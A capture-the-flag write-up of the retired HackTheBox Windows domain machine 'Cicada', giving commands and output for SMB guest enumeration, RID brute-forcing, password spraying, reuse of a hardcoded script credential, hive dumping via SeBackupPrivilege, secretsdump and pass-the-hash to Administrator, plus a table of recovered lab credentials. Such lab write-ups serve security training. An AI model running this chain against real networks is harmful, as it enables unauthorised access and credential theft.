# Cicada — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.231.149 |
| Domain | cicada.htb |
| DC | CICADA-DC.cicada.htb |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/cicada](https://jostif.pages.dev/writeups/cicada) |

**Techniques:** SMB guest access → HR notice (default password) → RID brute-force → password spray → PowerShell script credential leak → Backup Operators → SeBackupPrivilege → secretsdump → Administrator PTH

---

## Summary

Easy Windows AD machine. Anonymous SMB exposes an HR notice with a domain-wide default password. RID brute-force enumerates users — spraying finds `michael.wrightson` hasn't changed it. His access to the `DEV` share reveals a backup script with `emily.oscars`'s credentials hardcoded. Emily is in `Backup Operators` — `SeBackupPrivilege` allows dumping SAM/SYSTEM hives, cracked locally with `secretsdump` for the Administrator hash.

**Chain:** SMB guest → default password → spray → DEV share → emily.oscars → SeBackupPrivilege → secretsdump → Admin PTH

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.231.149
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap          Domain: cicada.htb
445/tcp  open  microsoft-ds
5985/tcp open  http          WinRM
clock-skew: mean: 7h00m01s
```

---

## 02 — SMB Enumeration

```bash
# List shares as guest
nxc smb 10.129.231.149 -u guest -p '' --shares
# HR   READ
# DEV  READ

# Get HR notice — contains default password
smbclient //10.129.231.149/HR -N
smb: \> get "Notice from HR.txt"
# Your default password is: Cicada$M6Corpb*@Lp#nZp!8

# Enumerate domain users via RID brute
nxc smb 10.129.231.149 -u guest -p '' --rid-brute
# john.smoulder, sarah.dantelia, michael.wrightson, david.orelious, emily.oscars
```

---

## 03 — Password Spray

```bash
nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
# [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

# Access DEV share as michael.wrightson
smbclient //10.129.231.149/DEV -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8'
smb: \> get Backup_script.ps1
```

`Backup_script.ps1` contents:
```powershell
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
```

**Credentials:** `emily.oscars : Q!3@Lp#M6b*7t*Vt`

---

## 04 — Foothold — WinRM as emily.oscars

```bash
evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'

# emily.oscars is in Backup Operators group
whoami /groups | findstr Backup
# BUILTIN\Backup Operators

type C:\Users\emily.oscars\Desktop\user.txt
```

**User flag obtained.**

---

## 05 — PrivEsc — SeBackupPrivilege → secretsdump

`Backup Operators` members hold `SeBackupPrivilege` — allows copying any file bypassing ACLs, including registry hives.

```bash
# Dump hives on target
*EWR* reg save HKLM\SAM C:\Temp\sam.hive
*EWR* reg save HKLM\SYSTEM C:\Temp\system.hive
*EWR* download C:\Temp\sam.hive
*EWR* download C:\Temp\system.hive

# Extract hashes locally
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# Administrator:500:...:2b87e7c93a3e8a0ea4a581937016f341:::
```

---

## 06 — Root — Pass-the-Hash

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'

type C:\Users\Administrator\Desktop\root.txt
```

**Root flag obtained.**

---

## Key takeaways

- **HR shares with default passwords** are a recurring HTB pattern — always read every file in non-standard SMB shares
- **RID brute-force** works unauthenticated when null sessions are enabled — always run before spraying
- **Backup Operators** is a highly privileged group often overlooked — `SeBackupPrivilege` is a direct path to SAM/SYSTEM
- **Hardcoded credentials in scripts** — PowerShell scripts stored on shares frequently contain plaintext passwords
- **secretsdump LOCAL** works offline against downloaded hives — no need for live DC access

---

## Credentials recovered

| User | Password / Hash | Source |
|---|---|---|
| michael.wrightson | Cicada$M6Corpb*@Lp#nZp!8 | HR notice (default) |
| emily.oscars | Q!3@Lp#M6b*7t*Vt | Backup_script.ps1 |
| Administrator | 2b87e7c93a3e8a0ea4a581937016f341 (NT) | secretsdump |

---

## Tools used

| Tool | Purpose |
|---|---|
| nxc (netexec) | SMB shares, RID brute, password spray |
| smbclient | File retrieval from shares |
| evil-winrm | WinRM shell |
| impacket-secretsdump | Offline hash extraction from hives |
